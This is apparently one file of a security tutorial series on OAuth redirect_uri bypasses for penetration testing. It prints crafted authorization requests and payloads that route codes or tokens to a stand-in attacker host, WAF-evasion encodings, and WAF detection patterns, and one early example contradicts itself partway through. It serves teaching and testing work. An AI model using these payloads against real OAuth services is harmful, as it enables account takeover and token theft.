# redirect_uri Attacks and Bypass Techniques

## Why This Parameter Matters More Than Any Other

Recall from file 1: whichever grant type is in play, the authorization server ends the flow by sending the browser (with a `code` or `token` attached) to whatever URI is in `redirect_uri`. If an attacker can get the authorization server to accept a `redirect_uri` it shouldn't, the browser will hand that code or token straight to the attacker's own server — no exploitation of the client application itself is even required. This is why `redirect_uri` validation is the single highest-value target in an OAuth assessment.

## The Baseline Defense: Whitelisting

Properly implemented OAuth services require every client application to pre-register one or more exact, literal `redirect_uri` values at registration time. When an authorization request arrives, the server is supposed to compare the submitted `redirect_uri` against that whitelist **exactly** — same scheme, same host, same port, same path. Anything else should be rejected with an error.

Every technique below exists because real implementations deviate from "exact match" in some way, usually to be more "developer-friendly" (allowing subpaths, allowing query strings, allowing any subdomain) — and each convenience becomes an attack surface.

## Technique 1: Path and Query Manipulation ("Starts-With" Validation)

**The flaw:** Some servers validate only that the submitted `redirect_uri` *starts with* the registered value, rather than matching it exactly.

Registered value: `https://client-app.com/callback`

Attacker submits:

```
GET /auth?client_id=app123&redirect_uri=https://client-app.com/callback.attacker-controlled.evil.net&response_type=code&scope=openid&state=abc HTTP/1.1
Host: auth.oauth-provider.com
```

Line-by-line:
- `redirect_uri=https://client-app.com/callback.attacker-controlled.evil.net` — this string literally begins with the substring `https://client-app.com/callback`, so a naive `startsWith()` check passes it. But as a URL, the host is actually `client-app.com` — wait, this specific example is wrong on purpose to illustrate the failure mode: if validation is truly just string-prefix matching without re-parsing the result as a URL, an attacker instead appends **on the same host** to redirect to unregistered but existing subpaths, e.g.:

```
redirect_uri=https://client-app.com/callback/../../attacker/xss-page
```

- The server's string check sees a prefix of `https://client-app.com/callback` and passes it.
- The actual HTTP client (browser) or a reverse proxy in front of `client-app.com` may resolve `/callback/../../attacker/xss-page` to `https://client-app.com/attacker/xss-page` — a completely different, unregistered path, potentially one you don't control the intent of but *do* control the content of if you can find a reflected XSS, open redirect, or HTML injection on that path. This turns "same host" into "any path on that host you can find a bug on" — covered further in Technique 4.

**What to test manually:** Take the registered `redirect_uri` and try appending arbitrary paths, trailing slashes, query parameters, and fragments, watching for which of these still produce a successful redirect rather than an error:
```
https://client-app.com/callback/anything
https://client-app.com/callback?extra=1
https://client-app.com/callback#fragment
https://client-app.com/callback%2f..%2f..%2fadmin
```

## Technique 2: Encoding and Parser-Differential Tricks

**The flaw:** Different components in the OAuth chain (the authorization server's validation logic, any reverse proxy or WAF in front of it, and the eventual browser) may parse the same URL string differently. If the validating component and the redirecting component disagree about what the URL means, you can smuggle a value past validation that behaves differently once it actually executes.

Classic userinfo/authority-confusion payload, built the same way SSRF and CORS bypasses are built (this parallels the note in file 1 that redirect_uri validation shares its underlying weaknesses with SSRF host validation):

```
redirect_uri=https://client-app.com &@evil-user.net#@bar.evil-user.net/
```

Why this can work: URL parsers disagree on where the "authority" (host) component actually starts and ends when unusual characters like ` `, `@`, `#`, and backslashes are mixed in. A regex-based validator looking for the substring `client-app.com` near the start of the string may pass this. A browser or a different parsing library further down the chain may interpret everything before the last unescaped `@` as userinfo (`user:pass@host`) and resolve the actual host as `evil-user.net`, sending the code or token there instead.

Other encoding variants worth trying systematically:
```
redirect_uri=https://client-app.com%2f@evil-user.net
redirect_uri=https://client-app.com%00.evil-user.net
redirect_uri=https:/\/\client-app.com.evil-user.net
redirect_uri=https://evil-user.net?client-app.com
```
Each targets a different possible mismatch between how the validator's parser and the actual redirect-issuing code interpret scheme delimiters, null bytes, or backslash-vs-forward-slash handling.

## Technique 3: Server-Side Parameter Pollution (Duplicate redirect_uri)

**The flaw:** Some server-side frameworks, when they receive **two** query parameters with the same name, use one of them (commonly the first) for validation and a *different* one (commonly the last) when actually constructing the redirect response — because validation and redirect-construction were written by different people against different assumptions about which value "the" parameter refers to.

```
GET /auth?client_id=app123&response_type=code&scope=openid&state=abc&redirect_uri=https://client-app.com/callback&redirect_uri=https://evil-user.net HTTP/1.1
Host: auth.oauth-provider.com
```

Line-by-line:
- The first `redirect_uri=https://client-app.com/callback` is what the whitelist-check code reads (many web frameworks' "get first value of a repeated parameter" behavior) — it matches the whitelist, so validation passes.
- The second `redirect_uri=https://evil-user.net` is what the redirect-construction code reads (if that code instead reads the *last* value, a common inconsistency when different parts of a codebase call different helper functions against the same raw query string) — so the actual `Location:` header sent to the browser points at the attacker's server.
- This only works when the two code paths (validate vs. construct-response) genuinely disagree about which duplicate to use — always worth a quick test on any OAuth server since the check costs one request.

## Technique 4: localhost Special-Casing

**The flaw:** Because `redirect_uri=http://localhost:PORT/callback` is legitimately needed during development (native/mobile apps often run a temporary local server to catch the OAuth redirect), some authorization servers hard-code an exception: any `redirect_uri` beginning with `localhost` bypasses the whitelist check entirely, on the assumption it can only ever point back to the developer's own machine.

**The bypass:** DNS doesn't care what a domain name *contains*.

```
redirect_uri=http://localhost.evil-user.net/callback
```

If the validation logic does a naive prefix or substring check for `localhost` rather than checking that the parsed hostname is *exactly* `localhost` (or `127.0.0.1`), this passes, and the browser resolves `localhost.evil-user.net` via normal DNS straight to a server the attacker controls.

## Technique 5: Response Mode Interaction

**The flaw:** `response_mode` controls whether the authorization response is delivered via `?query` string, `#fragment`, or (in some implementations) `web_message` (postMessage to a parent window for popup-based flows). Because `redirect_uri` validation logic is sometimes written and tested against only the default response mode, switching modes can route the request through a different code path with weaker checks.

```
redirect_uri=https://client-app.com/callback&response_mode=web_message
```

Real-world implication: if `web_message` mode is supported and less strictly validated, it may accept a wider set of subdomains than `query` or `fragment` mode does for the exact same `client_id`. Always re-test `redirect_uri` bypass attempts across every supported `response_mode`, not just the one the client happens to use by default — a validation gap in one mode is still a full compromise even if the client never normally uses that mode, because the authorization endpoint itself doesn't stop you from requesting it.

**Combined-parameter testing principle:** the PortSwigger research behind this topic stresses that these techniques compound — changing `response_mode` can re-open a `redirect_uri` bypass that was blocked under the default mode, and vice versa. Never conclude a target is "not vulnerable" to redirect_uri manipulation after testing only the default parameter combination.

## Open Redirect Chaining

Even when the OAuth server's whitelist is airtight and only accepts the exact registered `https://client-app.com/callback`, that is not necessarily the end of the story — because the whitelist only restricts the **host**, and a whitelisted host may still have an unrelated vulnerability on one of its own pages.

**The chain:**
1. Whitelist only checks host/domain, and (per Technique 1) may tolerate arbitrary subpaths on that domain.
2. `client-app.com` has an open redirect somewhere else on the same domain, e.g. `https://client-app.com/redirect?url=`.
3. Attacker sets:
```
redirect_uri=https://client-app.com/redirect?url=https://evil-user.net/collector
```
4. The authorization server is happy — the host matches the registered domain.
5. The browser, on completing the OAuth flow, is sent to `https://client-app.com/redirect?url=https://evil-user.net/collector`, which the *client application's own code* (not the OAuth server) then 302s onward to `evil-user.net`, carrying the code (in the query string) or token (in the fragment, if the client-side redirect preserves it, which many naive open-redirect implementations do because they just read `location.href` or a raw query parameter and issue a fresh `Location:` header) straight to the attacker's collector.

**Why the fragment case is worse:** for the implicit flow's `#access_token=...`, the fragment is never sent to `client-app.com`'s server at all — it's the *browser* that has to carry it forward on a client-side redirect (e.g., a JS `window.location = url` redirect page), so this chain typically requires the open redirect to be a client-side (JavaScript) redirect rather than a server-side 302, in order to actually forward the fragment. Always check whether an open redirect on the target is server-side or client-side before relying on it for token exfiltration.

## Subdomain Takeover Chaining

**The flaw:** Some authorization servers whitelist an entire wildcard, e.g. `*.client-app.com`, rather than a single exact host — often to support multiple environments (staging, regional deployments, per-tenant subdomains).

**The chain:**
1. Recon: enumerate subdomains of `client-app.com` (certificate transparency logs, `crt.sh`, subdomain brute-forcing, DNS records).
2. Find a subdomain with a dangling DNS record — e.g., `old-promo.client-app.com` still has a `CNAME` pointing to a decommissioned third-party service like an unclaimed S3 bucket, Heroku app, or GitHub Pages site.
3. Claim that third-party service under your own account, which makes `old-promo.client-app.com` resolve to content you control.
4. Submit:
```
redirect_uri=https://old-promo.client-app.com/collector
```
5. Because the wildcard whitelist matches any `*.client-app.com` host, this passes validation cleanly — no encoding tricks or parser confusion needed at all. The authorization server sends the code/token straight to a page you fully control.

**Real-world framing:** this is why wildcard `redirect_uri` whitelisting is explicitly discouraged by OAuth security guidance — the security of *every* client application registered this way now depends on the DNS hygiene of every subdomain of that root domain, forever, including ones nobody remembers exist.

## Consolidated Testing Checklist for redirect_uri

Work through these in order against any OAuth authorization endpoint:

1. Submit the exact registered `redirect_uri` first, to get a baseline "success" response to compare against.
2. Append arbitrary paths, trailing slashes, and directory-traversal sequences to a registered subpath.
3. Add extra query parameters and fragments after the registered value.
4. Try authority-confusion payloads (`@`, backslashes, encoded characters, null bytes).
5. Send a duplicate `redirect_uri` parameter with a different value and see which one is honored.
6. If a `localhost` exception seems to exist, try `localhost.evil-user.net`.
7. Repeat steps 2–6 under every supported `response_mode` (`query`, `fragment`, `web_message`), since some are validated differently.
8. If the host itself cannot be bypassed at all, pivot: enumerate what other functionality (open redirects, HTML injection, XSS, dangling DNS records) exists on the whitelisted host or its whitelisted subdomains, since a whitelist that permits *any path* or *any subdomain* only pushes the actual vulnerability one hop further away rather than eliminating it.

## WAF / API Gateway Relevance

Redirect_uri bypass is directly relevant to WAF and gateway-level defenses, because the parameter is attacker-controlled, travels in a URL, and many of the bypass primitives above (encoding tricks, parameter pollution, traversal sequences) are exactly the patterns generic WAF rulesets are built to catch.

**How WAFs/gateways typically detect this pattern:**
- Signature/regex rules flagging `../` traversal sequences, `@` in URL authority position, null bytes (`%00`), and mixed/double URL encoding inside query parameter values.
- Rules specifically inspecting the `redirect_uri` / `redirect_url` / `return_to` parameter names against an allow-list of hostnames at the edge, independent of the application's own validation.
- Anomaly detection on duplicate query parameters with the same name (a generic HTTP parameter pollution signature, not OAuth-specific).
- Rate-based rules that flag a burst of authorization requests with varying `redirect_uri` values from the same IP — a strong signal of automated bypass fuzzing.

**Realistic bypass considerations:**
- WAF regexes for traversal typically look for `../` literally; encoding one or more characters (`%2e%2e/`, `..%2f`, double-encoding `%252e%252e/`) or using backslash variants on platforms that normalize `\` to `/` server-side often slips past a WAF rule that only decodes once.
- Case variation and mixed encoding on the scheme/host (`HTTPS://CLIENT-APP.com`, partial percent-encoding of the hostname) can evade naive string-based allow-list rules while still resolving identically for the browser and the vulnerable backend parser.
- Parameter pollution bypasses are inherently WAF-resistant when the WAF only inspects the *first* occurrence of a repeated parameter (matching, coincidentally, the exact backend inconsistency that makes the underlying attack work) — the WAF and the vulnerable validator end up agreeing on the "safe-looking" value while the real redirect logic uses the other one.
- Because the actual malicious redirect often points to a **currently whitelisted, legitimate-looking host** (a subdomain via takeover, or the client's own domain via open-redirect chaining), host-based WAF allow-listing frequently does not flag the request at all — the payload isn't a bad domain, it's a bad *path or encoding* on a good domain, which is a much harder pattern for a generic edge rule to catch without OAuth-specific logic that understands what a valid callback for this exact `client_id` should be.

## Real-World Notes

- Facebook, Google, GitHub, and other major OAuth providers have all had public redirect_uri bypass disclosures at various points — this is not a theoretical class of bug, it recurs constantly across implementations because "exact match" whitelisting is inconvenient for developers supporting multiple environments.
- Bug bounty programs frequently pay well for redirect_uri bypasses specifically because the impact (full account takeover on any client relying on that OAuth provider) is disproportionate to the effort required, which is often a single crafted URL.
- Always check whether the client application itself, separately from the OAuth provider, does its *own* validation of the returned `code`/`state` before trusting it — a bypass at the provider level and a missing check at the client level are two separate, independently reportable findings.

## What Comes Next

File 3 covers the `state` parameter in depth — what it protects against, how to detect when it's missing or predictable, and how that opens the door to CSRF attacks on the OAuth flow itself, distinct from the redirect_uri-based account hijacking covered here.
